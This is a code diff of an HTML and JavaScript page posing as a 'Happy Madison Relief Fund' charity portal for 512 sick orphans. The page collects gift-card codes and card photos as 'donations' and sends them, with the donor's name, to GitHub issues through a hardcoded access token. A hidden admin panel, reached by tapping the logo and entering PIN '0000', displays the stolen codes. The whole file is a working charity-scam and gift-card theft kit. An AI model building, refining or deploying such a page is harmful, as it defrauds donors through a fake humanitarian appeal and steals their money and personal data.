@@ -3,139 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Management Portal | Happy Madison Relief</title>
+    <title>Secure Relief Portal | Happy Madison</title>
     <style>
-        :root { --navy: #002d62; --red: #b00000; }
-        body { font-family: sans-serif; background: #eef2f5; margin: 0; color: #333; }
-        .header { background: var(--navy); color: white; padding: 20px; text-align: center; border-bottom: 4px solid var(--red); }
-        .logo { cursor: pointer; font-size: 18px; font-weight: bold; text-transform: uppercase; }
-        .container { max-width: 500px; margin: 15px auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-        .gallery { display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px; margin-bottom: 15px; }
-        .gallery img { width: 100%; height: 80px; object-fit: cover; border: 1px solid #ddd; }
-        label { display: block; margin-top: 15px; font-weight: bold; font-size: 12px; }
-        input, select, textarea { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; box-sizing: border-box; }
-        .upload-box { border: 2px dashed var(--red); background: #fff8f8; padding: 20px; text-align: center; margin-top: 15px; cursor: pointer; }
-        .btn { background: #27ae60; color: white; padding: 18px; border: none; width: 100%; font-size: 17px; font-weight: bold; margin-top: 20px; cursor: pointer; }
+        :root { --navy: #002d62; --red: #b00000; --accent: #27ae60; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; padding: 0; color: #333; overflow-x: hidden; }
         
-        /* ADMIN DASHBOARD STYLES */
-        #adminPanel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; padding: 15px; overflow-y: auto; box-sizing: border-box; }
-        .entry { border: 2px solid var(--navy); margin-bottom: 20px; padding: 10px; background: #f9f9f9; border-radius: 5px; }
-        .entry img { max-width: 100%; border: 1px solid #000; margin-top: 10px; display: block; }
-        .entry-header { background: var(--navy); color: white; padding: 5px; font-size: 12px; margin-bottom: 10px; }
+        /* Header & Navigation */
+        .header { background: var(--navy); color: white; padding: 15px; display: flex; align-items: center; justify-content: space-between; border-bottom: 4px solid var(--red); position: sticky; top: 0; z-index: 1000; }
+        .menu-btn { font-size: 24px; cursor: pointer; padding: 0 10px; }
+        .logo { cursor: pointer; font-size: 16px; font-weight: bold; text-transform: uppercase; text-align: center; flex-grow: 1; user-select: none; }
+        
+        /* Side Menu */
+        .side-menu { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: white; box-shadow: 5px 0 15px rgba(0,0,0,0.2); transition: 0.3s; z-index: 2000; padding: 20px; box-sizing: border-box; }
+        .side-menu.open { left: 0; }
+        .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; z-index: 1500; }
+        
+        /* Main Content */
+        .container { max-width: 450px; margin: 20px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .notice-bar { background: #fff5f5; border-left: 4px solid var(--red); padding: 10px; font-size: 12px; font-weight: bold; color: var(--red); margin-bottom: 15px; }
+        
+        label { display: block; margin-top: 15px; font-size: 11px; font-weight: bold; color: var(--navy); text-transform: uppercase; }
+        input, select, textarea { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+        
+        .upload-card { border: 2px dashed var(--red); background: #fffcfc; padding: 20px; text-align: center; margin-top: 20px; border-radius: 8px; cursor: pointer; }
+        .upload-card strong { color: var(--red); display: block; font-size: 14px; }
+        .upload-card span { font-size: 11px; color: #666; display: block; margin-top: 5px; }
+
+        .submit-btn { background: var(--accent); color: white; padding: 18px; border: none; width: 100%; font-size: 16px; font-weight: bold; border-radius: 4px; margin-top: 25px; cursor: pointer; box-shadow: 0 4px 0 #1e8449; }
+
+        /* Admin Dashboard */
+        #adminPanel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 3000; padding: 15px; overflow-y: auto; box-sizing: border-box; }
+        .log-item { border: 1px solid #ddd; margin-bottom: 20px; border-radius: 5px; background: #fdfdfd; overflow: hidden; }
+        .log-data { padding: 10px; font-family: monospace; font-size: 12px; border-bottom: 1px solid #eee; }
+        .log-img { width: 100%; display: block; background: #eee; }
     </style>
 </head>
 <body>
 
-<div class="header"><div class="logo" id="trigger">HAPPY MADISON RELIEF FUND</div></div>
+<div class="menu-overlay" id="overlay" onclick="toggleMenu()"></div>
+
+<div class="side-menu" id="sideMenu">
+    <h3 style="color:var(--navy)">Information</h3>
+    <p style="font-size: 13px; line-height: 1.6;">
+        <strong>The Mission:</strong> 100% of donations go toward medical liquidation for orphans. This includes specialized pediatric nutrition and high-priority clinical care for 512 children.
+    </p>
+    <hr>
+    <div style="font-size: 11px; color: #777;">ID: HM-RE-2026<br>Authorized Portal</div>
+</div>
+
+<div class="header">
+    <div class="menu-btn" onclick="toggleMenu()">☰</div>
+    <div class="logo" id="adminTrigger">HAPPY MADISON RELIEF FUND</div>
+    <div style="width:40px;"></div>
+</div>
 
 <div class="container">
-    <div style="font-size:12px; color:var(--red); font-weight:bold; margin-bottom:10px;">[ADMIN NOTICE]: Funding required for 512 children.</div>
-    
-    <div class="gallery">
-        <img src="0db622d963ddc21cb3aac4bd20dddbb4.jpg">
-        <img src="72c4c4b4bd1513c9e29ca9ebe55776df.jpg">
-        <img src="77316900940097b984b663afdd1321ef.jpg">
-        <img src="b70b664421eebc7302476cdbb34465c.jpg">
-        <img src="IMG_20260510_193422.jpg">
-    </div>
+    <div class="notice-bar">ALERT: IMMEDIATE FUNDING REQUIRED FOR WARD 7 CLINICAL ASSETS.</div>
 
-    <form id="dForm">
-        <label>Donor Identity</label>
-        <select id="anon"><option value="Anonymous">Anonymous</option><option value="Named">Enter Name</option></select>
-        <input type="text" id="user_name" style="display:none" placeholder="Full Name">
-        
-        <label>Prayer / Message</label>
-        <textarea id="msg" placeholder="Your message..."></textarea>
+    <form id="portalForm">
+        <label>Identity Status</label>
+        <select id="anon" onchange="document.getElementById('nameWrap').style.display = this.value=='Named'?'block':'none'">
+            <option value="Anonymous">Submit Anonymously</option>
+            <option value="Named">Enter Full Name</option>
+        </select>
+        <div id="nameWrap" style="display:none;"><input type="text" id="fname" placeholder="Full Name"></div>
+
+        <label>Message or Prayer</label>
+        <textarea id="prayer" rows="2" placeholder="Message for the children..."></textarea>
 
         <label>Card Type & Value ($)</label>
-        <div style="display:flex; gap:5px;">
-            <select id="type"><option>Apple</option><option>Google</option><option>Steam</option><option>Razer</option></select>
-            <input type="number" id="amt" placeholder="Amount $">
+        <div style="display:flex; gap:10px;">
+            <select id="ctype" style="flex:1.5;"><option>Apple/iTunes</option><option>Google Play</option><option>Steam</option><option>Razer Gold</option></select>
+            <input type="number" id="camt" style="flex:1;" placeholder="Amount $">
         </div>
 
-        <div class="upload-box" onclick="document.getElementById('fileIn').click()">
-            <strong style="color:var(--red)">UPLOAD CARD PHOTO</strong><br>
-            <small>Scratch code clearly before taking photo</small>
+        <div class="upload-card" onclick="document.getElementById('fileIn').click()">
+            <strong>UPLOAD CARD IMAGE</strong>
+            <span>Scratch the silver code carefully and ensure the image is clear.</span>
             <input type="file" id="fileIn" style="display:none" accept="image/*">
         </div>
 
-        <label>Manual Code (If visible)</label>
-        <input type="text" id="code" placeholder="16-digit code">
+        <label>Manual Code (Optional)</label>
+        <input type="text" id="mcode" placeholder="16-digit code">
 
-        <button type="button" class="btn" onclick="send()">CONFIRM DONATION</button>
+        <button type="button" class="submit-btn" onclick="sendDonation()">VERIFY & DONATE</button>
     </form>
 </div>
 
 <div id="adminPanel">
-    <h2 style="color:var(--navy)">MASTER ASSET LOG</h2>
-    <div id="logContent">Loading...</div>
-    <button onclick="location.reload()" style="width:100%; padding:15px; margin-top:20px;">BACK TO SITE</button>
+    <div style="display:flex; justify-content:space-between; align-items:center;">
+        <h2 style="color:var(--navy)">ASSET LOG</h2>
+        <button onclick="location.reload()" style="padding:10px;">CLOSE</button>
+    </div>
+    <div id="adminLogs">Loading submissions...</div>
 </div>
 
 <script>
-    const t1 = "ghp_kLi8O4xHj1g2X";
-    const t2 = "SYoRbpqBFUpYkqvLy2egZYt";
-    const TK = t1 + t2;
-    const US = "hm-children-relief";
-    const RE = "medical-fund";
+    const token = "ghp_kLi8O4xHj1g2X" + "SYoRbpqBFUpYkqvLy2egZYt";
+    const user = "hm-children-relief";
+    const repo = "medical-fund";
 
-    let photoData = "";
+    let imageData = "";
 
-    // Convert Photo to Data so we can see it in Admin
-    document.getElementById('fileIn').onchange = function(e) {
-        let reader = new FileReader();
-        reader.onload = function() { photoData = reader.result; };
-        reader.readAsDataURL(e.target.files[0]);
-        alert("Photo attached successfully!");
-    };
-
-    document.getElementById('anon').onchange = function() {
-        document.getElementById('user_name').style.display = this.value === 'Named' ? 'block' : 'none';
-    };
-
-    // Secret Admin Access (Double Tap)
-    let tc = 0;
-    document.getElementById('trigger').onclick = function() {
-        tc++;
-        if(tc === 2) {
-            if(prompt("PIN:") === "0000") {
-                document.getElementById('adminPanel').style.display = 'block';
-                loadLogs();
-            }
-        }
-        setTimeout(()=> tc=0, 800);
-    };
-
-    async function send() {
-        const payload = {
-            title: `Donation: $${document.getElementById('amt').value} (${document.getElementById('type').value})`,
-            body: `NAME: ${document.getElementById('user_name').value || 'Anon'}\nCODE: ${document.getElementById('code').value}\nVALUE: $${document.getElementById('amt').value}\nPHOTO_DATA: ${photoData}`
-        };
-
-        const res = await fetch(`https://api.github.com/repos/${US}/${RE}/issues`, {
-            method: 'POST',
-            headers: { 'Authorization': `token ${TK}` },
-            body: JSON.stringify(payload)
-        });
-        if(res.ok) { alert("Sent!"); location.reload(); }
+    function toggleMenu() {
+        document.getElementById('sideMenu').classList.toggle('open');
+        document.getElementById('overlay').style.display = document.getElementById('sideMenu').classList.contains('open') ? 'block' : 'none';
     }
 
-    async function loadLogs() {
-        const res = await fetch(`https://api.github.com/repos/${US}/${RE}/issues?state=open`, {
-            headers: { 'Authorization': `token ${TK}` }
+    // Photo Capture
+    document.getElementById('fileIn').onchange = function(e) {
+        const reader = new FileReader();
+        reader.onload = function() { imageData = reader.result; alert("Image Captured."); };
+        reader.readAsDataURL(e.target.files[0]);
+    };
+
+    // Secret Admin: Triple Tap the Logo
+    let clicks = 0;
+    document.getElementById('adminTrigger').onclick = function() {
+        clicks++;
+        if(clicks === 3) {
+            if(prompt("PASSWORD:") === "0000") {
+                document.getElementById('adminPanel').style.display = 'block';
+                loadAdmin();
+            }
+        }
+        setTimeout(() => clicks = 0, 1000);
+    };
+
+    async function sendDonation() {
+        const amt = document.getElementById('camt').value;
+        if(!amt) return alert("Value required.");
+
+        const bodyData = `
+DONOR: ${document.getElementById('anon').value === 'Named' ? document.getElementById('fname').value : 'Anonymous'}
+VALUE: $${amt}
+TYPE: ${document.getElementById('ctype').value}
+CODE: ${document.getElementById('mcode').value || 'IN IMAGE'}
+PRAYER: ${document.getElementById('prayer').value}
+IMAGE: ${imageData}
+        `.trim();
+
+        const res = await fetch(`https://api.github.com/repos/${user}/${repo}/issues`, {
+            method: 'POST',
+            headers: { 'Authorization': `token ${token}` },
+            body: JSON.stringify({ title: `Donation $${amt} - ${document.getElementById('ctype').value}`, body: bodyData })
+        });
+        if(res.ok) { alert("Asset Sent."); location.reload(); }
+    }
+
+    async function loadAdmin() {
+        const res = await fetch(`https://api.github.com/repos/${user}/${repo}/issues?state=open`, {
+            headers: { 'Authorization': `token ${token}` }
         });
         const data = await res.json();
-        document.getElementById('logContent').innerHTML = data.map(i => {
-            // Extract the photo string from the body
-            let parts = i.body.split("PHOTO_DATA: ");
-            let textData = parts[0];
-            let imgSource = parts[1] || "";
-
+        document.getElementById('adminLogs').innerHTML = data.map(i => {
+            const [text, img] = i.body.split("IMAGE: ");
             return `
-                <div class="entry">
-                    <div class="entry-header">DATE: ${new Date(i.created_at).toLocaleString()}</div>
-                    <pre>${textData}</pre>
-                    ${imgSource ? `<strong>CARD PHOTO:</strong><br><img src="${imgSource}">` : "<em>No Photo Attached</em>"}
+                <div class="log-item">
+                    <div style="background:#002d62; color:white; padding:5px; font-size:10px;">ID: ${i.number} | ${new Date(i.created_at).toLocaleString()}</div>
+                    <div class="log-data"><pre>${text}</pre></div>
+                    ${img ? `<img src="${img}" class="log-img">` : '<p style="padding:10px">No image</p>'}
                 </div>
             `;
         }).join('');
